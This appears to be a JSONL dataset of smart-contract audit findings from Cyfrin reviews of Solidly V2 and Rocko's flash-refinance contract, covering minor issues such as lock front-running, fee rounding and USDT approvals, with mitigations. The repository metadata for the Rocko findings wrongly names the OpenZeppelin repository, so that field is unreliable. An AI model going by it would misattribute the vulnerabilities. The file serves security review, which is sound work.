{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-05-04-cyfrin-solidly-v2-memecore-v2-2-009", "doc_id": "cyfrin_2024-05-04-cyfrin-solidly-v2-memecore-v2-2", "finding_index": 9, "page_start": null, "title": "Lock creation can be front-run", "short_summary": null, "description_md": null, "full_markdown": "### Lock creation can be front-run\n\n**Description:** `SolidlyV2ERC42069::lockToken` can be front-run with the transfer of a dust lock. This would cause the index at which the lock is created to be different from what the sender expected when sending the transaction.\n\nIn the worst case, this could cause the wrong lock to be withdrawn, extended, or split. If the sender is attentive, this can be easily remedied, but it could waste the gas cost for one TX.\n\n**Impact:** The index at which a lock is created/split/transferred can be something other than expected.\n\n**Recommended Mitigation:** Consider mentioning in the documentation that the user needs to use the events emitted to verify at which index their lock was created.\n\n**Solidly Labs:** Acknowledged.\n\n**Cyfrin:** Acknowledged.\n\n\\clearpage\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SolidlyLabs/v2-core", "org": "SolidlyLabs", "name": "v2-core", "commit": "757b18ad05780d2af22018b0c2c9d59422dc59d3", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-05-04-cyfrin-solidly-v2-memecore-v2-2.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.918503+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.919093+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-05-04-cyfrin-solidly-v2-memecore-v2-2-010", "doc_id": "cyfrin_2024-05-04-cyfrin-solidly-v2-memecore-v2-2", "finding_index": 10, "page_start": null, "title": "Cache domain separator and only recompute if the chain ID has changed", "short_summary": null, "description_md": null, "full_markdown": "### Cache domain separator and only recompute if the chain ID has changed\n\nFor greater gas efficiency, it is recommended that the current chain ID be cached on contract creation and that the domain separator be recomputed only if a change of chain ID is detected (i.e., ` block.chainid` != cached chain ID). An example can be seen in the implementation of [`Solmate::ERC20`](https://github.com/transmissions11/solmate/blob/c892309933b25c03d32b1b0d674df7ae292ba925/src/tokens/ERC20.sol).\n\n**Solidly Labs:** Acknowledged.\n\n**Cyfrin:** Acknowledged.\n", "severity": "Gas", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SolidlyLabs/v2-core", "org": "SolidlyLabs", "name": "v2-core", "commit": "757b18ad05780d2af22018b0c2c9d59422dc59d3", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-05-04-cyfrin-solidly-v2-memecore-v2-2.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.918503+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.919093+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Gas", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0-001", "doc_id": "cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0", "finding_index": 1, "page_start": null, "title": "Protocol fee should round up in favor of the protocol", "short_summary": null, "description_md": null, "full_markdown": "### Protocol fee should round up in favor of the protocol\n\n**Description:** Protocol fee should round up in favor of the protocol in `onMorphoFlashLoan`:\n```solidity\nuint256 rockoFeeBP = ROCKO_FEE_BP;\nif (rockoFeeBP > 0) {\n    unchecked {\n        feeAmount = (flashBorrowAmount * rockoFeeBP) / BASIS_POINTS_DIVISOR;\n        borrowAmountWithFee += feeAmount;\n    }\n}\n```\n\nConsider [using](https://x.com/DevDacian/status/1892529633104396479) OpenZeppelin [`Math::mulDiv`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/fda6b85f2c65d146b86d513a604554d15abd6679/contracts/utils/math/Math.sol#L280) with the rounding parameter or Solady [`FixedPointMathLib::fullMulDivUp`](https://github.com/Vectorized/solady/blob/c9e079c0ca836dcc52777a1fa7227ef28e3537b3/src/utils/FixedPointMathLib.sol#L548).\n\nAnother benefit of using these libraries is that intermediate overflow from the multiplication of `flashBorrowAmount * rockoFeeBP` is avoided.\n\n**Rocko:** Fixed in commit [a59ba0e](https://github.com/getrocko/onchain/commit/a59ba0e7958c544ad95788ce29923a342a2ea35a).\n\n**Cyfrin:** Verified.\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "fda6b85f2c65d146b86d513a604554d15abd6679", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-03-28-cyfrin-rocko-refinance-v2.0.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.921544+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.922340+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0-002", "doc_id": "cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0", "finding_index": 2, "page_start": null, "title": "Refinancing reverts for `USDT` debt token", "short_summary": null, "description_md": null, "full_markdown": "### Refinancing reverts for `USDT` debt token\n\n**Description:** Refinancing reverts for `USDT` debt token due to the way protocol uses standard `IERC20::approve` and `transfer` functions.\n\n**Impact:** Refinancing is bricked for `USDT` debt tokens. Marked as Low severity as officially only `USDC` is supported at this time. Note the implementation of `USDT` is different across chains; the protocol \"as-is\" would work with `USDT` on Base but not on Ethereum mainnet.\n\n**Proof of Concept:** As part of the audit we have provided a fork fuzz testing suite; run this command: `forge test --fork-url ETH_RPC_URL --fork-block-number 22000000 --match-test test_FuzzRefinance_AaveToCompound_DepWeth_BorUsdt -vvv`\n\n**Recommended Mitigation:** Replace all uses of `IERC20::approve` with [`SafeERC20::forceApprove`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#L101-L108) and `IERC20::transfer` with `SafeERC20::safeTransfer` at L738, then re-run the PoC test and it now passes.\n\nIdeally for added safety to prevent front-running of changes to existing approvals, use [`SafeERC20::safeIncreaseAllowance`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#L68-L71) and [`safeDecreaseAllowance`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#L82-L90) where suitable (for example in `_revokeTokenSpendApprovals` when the previous allowance amount is known could instead use `safeDecreaseAllowance`).\n\n**Rocko:** Fixed in commit [751e906](https://github.com/getrocko/onchain/commit/751e906b7c2df6cb587e709b12de25593eb02c75).\n\n**Cyfrin:** Verified.\n\n\\clearpage\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "fda6b85f2c65d146b86d513a604554d15abd6679", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-03-28-cyfrin-rocko-refinance-v2.0.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.921544+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.922340+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0-003", "doc_id": "cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0", "finding_index": 3, "page_start": null, "title": "Error messages hardcode `USDC` but other debt tokens may be used", "short_summary": null, "description_md": null, "full_markdown": "### Error messages hardcode `USDC` but other debt tokens may be used\n\n**Description:** Error messages hardcode `USDC` but other token may be used, eg:\n```solidity\nfunction _closeLoanPositionAndReturnCollateralBalance(\n    // @audit debt token can be other tokens apart from USDC but error\n    // message hardcodes USDC\n    require(\n        debtBalance <= IERC20(debtTokenAddress).balanceOf(FLASH_LOAN_CONTRACT),\n        \"Insufficient USDC available in the flash contract\"\n    );\n```\n\nThis code in `onMorphoFlashLoan` also assumes the debt token will be USDC:\n```solidity\nuint256 usdcBalance = IERC20(ctx.debtTokenAddress).balanceOf(FLASH_LOAN_CONTRACT);\nbool feeAmountAvailable = usdcBalance >= feeAmount;\n```\n\n**Rocko:** Fixed in commit [ec9f5be](https://github.com/getrocko/onchain/commit/ec9f5be20f9249cd20fcc1e173192361ecd97ef5).\n\n**Cyfrin:** Verified.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "fda6b85f2c65d146b86d513a604554d15abd6679", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-03-28-cyfrin-rocko-refinance-v2.0.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.921544+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.922340+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0-004", "doc_id": "cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0", "finding_index": 4, "page_start": null, "title": "Events missing indexed parameters", "short_summary": null, "description_md": null, "full_markdown": "### Events missing indexed parameters\n\n**Description:** Events in Solidity can have up to three indexed parameters, which are stored as topics in the event log. Indexed parameters allow for efficient filtering and searching of events by off-chain services. Without indexed parameters, it becomes more difficult and resource-intensive for applications to filter for specific events.\n\nThere are instances of events missing indexed parameters that could be improved.\n```solidity\n    event LogRefinanceLoanCall(\n        string logType,\n        address rockoWallet,\n        string from,\n        string to,\n        uint256 debtBalance,\n        address debtTokenAddress,\n        address collateralTokenAddress,\n        address aCollateralTokenAddress,\n        Id morphoMarketId\n    );\n    event LogFlashLoanCallback(\n        string logType,\n        address rockoWallet,\n        string from,\n        string to,\n        address debtTokenAddress,\n        address collateralTokenAddress,\n        address aCollateralTokenAddress,\n        uint256 flashBorrowAmount,\n        bytes data,\n        Id morphoMarketId\n    );\n```\n\n**Recommended Mitigation:** Add the `indexed` keyword to important parameters in the event that would commonly be used for filtering, such as `rockoWallet`, `debtTokenAddress`, and `collateralTokenAddress`.\n\n**Rocko:** Fixed in commit [f5c9c80](https://github.com/getrocko/onchain/commit/f5c9c8051d5ba1bf04774ae6e8aa407aeddbcde1).\n\n**Cyfrin:** Verified.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "fda6b85f2c65d146b86d513a604554d15abd6679", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-03-28-cyfrin-rocko-refinance-v2.0.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.921544+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.922340+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0-005", "doc_id": "cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0", "finding_index": 5, "page_start": null, "title": "Unnecessary event emission when configuration values do not change", "short_summary": null, "description_md": null, "full_markdown": "### Unnecessary event emission when configuration values do not change\n\n**Description:** `RockoFlashRefinance::updateFee` updates the `ROCKO_FEE_BP` variable and emits a `FeeUpdated` event regardless of whether the new fee value is different from the current one. This leads to unnecessary event emissions when the owner calls the function with the same fee value that is already set.\nThe function `pauseContract` can be improved similarly too.\n\n**Rocko:** Fixed in commit [99a73dc](https://github.com/getrocko/onchain/commit/99a73dc20fce34811c224fdd46b7e173748bfeb8).\n\n**Cyfrin:** Verified.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "fda6b85f2c65d146b86d513a604554d15abd6679", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-03-28-cyfrin-rocko-refinance-v2.0.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.921544+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.922340+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0-006", "doc_id": "cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0", "finding_index": 6, "page_start": null, "title": "Inconsistent implementation approach for retrieving collateral balance from Morpho", "short_summary": null, "description_md": null, "full_markdown": "### Inconsistent implementation approach for retrieving collateral balance from Morpho\n\n**Description:** `RockoFlashRefinance::_collateralBalanceOfMorpho` uses direct storage slot access to retrieve a user's collateral balance from Morpho, while similar functionality for debt retrieval is implemented using `MorphoLib`. This inconsistency in the implementation approach makes the code less readable and maintainable.\n```solidity\n    function _collateralBalanceOfMorpho(\n        Id morphoMarketId,\n        address rockoWallet\n    ) private view returns (uint256 totalCollateralAssets) {//@audit-issue use MorphoLib::collateral instead\n        bytes32[] memory slots = new bytes32[](1);\n        slots[0] = MorphoStorageLib.positionBorrowSharesAndCollateralSlot(morphoMarketId, rockoWallet);\n        bytes32[] memory values = MORPHO.extSloads(slots);\n        totalCollateralAssets = uint256(values[0] >> 128);\n    }\n\n    function _getMorphoDebtAndShares(Id marketId, address rockoWallet) private returns (uint256 debt, uint256 shares) {\n        MarketParams memory marketParams = MORPHO.idToMarketParams(marketId);\n        MORPHO.accrueInterest(marketParams);\n\n        uint256 totalBorrowAssets = MORPHO.totalBorrowAssets(marketId);\n        uint256 totalBorrowShares = MORPHO.totalBorrowShares(marketId);\n        shares = MORPHO.borrowShares(marketId, rockoWallet);\n        debt = shares.toAssetsUp(totalBorrowAssets, totalBorrowShares);\n    }\n```\n\n**Recommended Mitigation:** Refactor `_collateralBalanceOfMorpho` to use `MorphoLib::collateral` for consistency with other parts of the codebase:\n\n```diff\nfunction _collateralBalanceOfMorpho(\n    Id morphoMarketId,\n    address rockoWallet\n) private view returns (uint256 totalCollateralAssets) {\n-    bytes32[] memory slots = new bytes32[](1);\n-    slots[0] = MorphoStorageLib.positionBorrowSharesAndCollateralSlot(morphoMarketId, rockoWallet);\n-    bytes32[] memory values = MORPHO.extSloads(slots);\n-    totalCollateralAssets = uint256(values[0] >> 128);\n+    totalCollateralAssets = MorphoLib.collateral(MORPHO, morphoMarketId, rockoWallet);\n}\n```\n\n**Rocko:** Fixed in commit [5ef86b4](https://github.com/getrocko/onchain/commit/5ef86b44063a988afed93fe3f69074be757768bd).\n\n**Cyfrin:** Verified.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "fda6b85f2c65d146b86d513a604554d15abd6679", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-03-28-cyfrin-rocko-refinance-v2.0.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.921544+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.922340+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0-007", "doc_id": "cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0", "finding_index": 7, "page_start": null, "title": "Insufficient data length validation in `onMorphoFlashLoan`", "short_summary": null, "description_md": null, "full_markdown": "### Insufficient data length validation in `onMorphoFlashLoan`\n\n**Description:** `RockoFlashRefinance::onMorphoFlashLoan` performs a basic check on the length of the `data` parameter, requiring it to be at least 20 bytes. However, this check is insufficient as the actual data being sent is much larger, containing multiple addresses, strings, and an Id parameter. The minimum expected data length should be at least 256 bytes plus additional bytes for dynamic string data.\n\n**Recommended Mitigation:**\n```diff\n-        require(data.length >= 20, \"Invalid data\");\n+        require(data.length >= 256, \"Invalid data\");\n```\n\n**Rocko:** Fixed in commit [1da67d7](https://github.com/getrocko/onchain/commit/1da67d7f3ae8076a6cc135ef9a6e5595ad6e29a2).\n\n**Cyfrin:** Verified.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "fda6b85f2c65d146b86d513a604554d15abd6679", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-03-28-cyfrin-rocko-refinance-v2.0.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.921544+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.922340+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0-008", "doc_id": "cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0", "finding_index": 8, "page_start": null, "title": "In `_withdrawAaveCollateral` fetch `aTokenAddress` from Aave instead of receiving as input in `refinance` as passing it to morpho and back again", "short_summary": null, "description_md": null, "full_markdown": "### In `_withdrawAaveCollateral` fetch `aTokenAddress` from Aave instead of receiving as input in `refinance` as passing it to morpho and back again\n\n**Description:** Aave's `aTokenAddress` is only required when withdrawing collateral in `_withdrawAaveCollateral`, but currently it is:\n* passed in as input to `refinance`\n* has some validation performed on it\n* encoded along with other data and sent to `Morpho::flashLoan`\n* then Morpho passes it back when calling `onMorphoFlashLoan`\n* where it is decoded again and passed around some more\n\nInstead of all this, simply use Aave's API function [`IPool::getReserveData`](https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/interfaces/IPool.sol#L582) to get the correct `aTokenAddress` inside `_withdrawAaveCollateral` where it is required:\n```solidity\n    function _withdrawAaveCollateral(\n        address collateralAddress,\n        uint256 collateralBalance,\n        address rockoWallet\n    ) private {\n        DataTypes.ReserveData memory reserveData = AAVE.getReserveData(collateralAddress);\n\n        // Rocko Wallet needs to send aToken here after debt is paid off\n        // Be sure that Rocko Wallet has approved this contract to spend aTokens for > `collateralBalance` tokens\n        _pullTokensFromCallerWallet(reserveData.aTokenAddress, rockoWallet, collateralBalance);\n\n        // function withdraw(address asset, uint256 amount, address to)\n        AAVE.withdraw(collateralAddress, collateralBalance, FLASH_LOAN_CONTRACT);\n    }\n```\n\nFetching this parameter via Aave's API removes unnecessary code/validations also decreases the attack surface.\n\n**Rocko:** Fixed in commit [d793f96](https://github.com/getrocko/onchain/commit/d793f960598240fa3eacdc6a4ec67d55dcfa2a75).\n\n**Cyfrin:** Verified.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "fda6b85f2c65d146b86d513a604554d15abd6679", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-03-28-cyfrin-rocko-refinance-v2.0.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.921544+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.922340+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0-009", "doc_id": "cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0", "finding_index": 9, "page_start": null, "title": "Provide a way for users to revoke all approvals", "short_summary": null, "description_md": null, "full_markdown": "### Provide a way for users to revoke all approvals\n\n**Description:** `RockoFlashRefinance` is designed to move existing loan positions from one lending protocol to another. On behalf of the user the contract must be able to:\n* close the loan from the previous lending provider\n* open a new loan on the new lending provider\n\nFor Aave, users must allow the refinance contract to spend the [AToken](https://github.com/aave/aave-v3-core/blob/master/contracts/protocol/tokenization/AToken.sol) to close the position and to spend the [VariableDebtToken](https://github.com/aave/aave-v3-core/blob/master/contracts/protocol/tokenization/VariableDebtToken.sol) to open a new position.\n\nFor Compound (Comet), users must allow the refinance contract by calling the [allow function](https://github.com/compound-finance/comet/blob/68cd639c67626c86e890e5aac775ad4b6405d923/contracts/CometExt.sol#L162C14-L162C19).\n\nFor Morpho, users must authorize the refinance protocol by calling the [setAuthorization](https://github.com/morpho-org/morpho-blue/blob/9e2b0755b47bbe5b09bf1be8f00e060d4eab6f1c/src/Morpho.sol#L437C14-L437C30) function.\n\nThe protocol team provided their frontend source related to these approvals and there were only \"approving\" support, not revoking. It is recommended to provide an easy way for users to revoke all these approvals.\n\n**Rocko:** Users revokes will be included in the batch transaction when called from the Rocko app.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "fda6b85f2c65d146b86d513a604554d15abd6679", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-03-28-cyfrin-rocko-refinance-v2.0.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.921544+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.922340+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0-010", "doc_id": "cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0", "finding_index": 10, "page_start": null, "title": "Consider allowing update to `AAVE_DATA_PROVIDER`", "short_summary": null, "description_md": null, "full_markdown": "### Consider allowing update to `AAVE_DATA_PROVIDER`\n\n**Description:** `RockoFlashRefinance::AAVE_DATA_PROVIDER` immutably stores the address of `AaveProtocolDataProvider`. However `AaveProtocolDataProvider` is not upgradeable and the \"current\" one on mainnet was deployed 43 days ago to address 0x497a1994c46d4f6C864904A9f1fac6328Cb7C8a6.\n\nHence consider whether `AAVE_DATA_PROVIDER` should not be `immutable` and an `onlyOwner` function should exist to allow updating it in the future.\n\nSince `RockoFlashRefinance` has no relevant internal state it can just be re-deloyed. The trade-off is having  `immutable` `AAVE_DATA_PROVIDER` means user transactions involving it cost slightly less gas but the contract needs to be re-deployed to update it.\n\n**Rocko:** Acknowledged; prefer the current setup for lower user gas costs.\n\n\\clearpage\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "fda6b85f2c65d146b86d513a604554d15abd6679", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-03-28-cyfrin-rocko-refinance-v2.0.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.921544+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.922340+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
